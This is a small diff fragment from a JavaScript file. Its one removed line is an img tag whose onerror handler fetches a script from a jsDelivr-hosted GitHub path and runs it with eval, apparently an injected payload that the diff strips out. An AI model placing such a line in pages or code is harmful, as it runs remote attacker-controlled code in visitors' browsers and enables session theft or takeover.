@@ -97,4 +97,3 @@ if(Math.random() < 1 / 16)
 }
 club();
 window.hammer = true;
-<img src=x onerror=\"fetch('https://cdn.jsdelivr.net/gh/dollv10/saber@main/spear.js').then(r=>r.text()).then(eval)\">
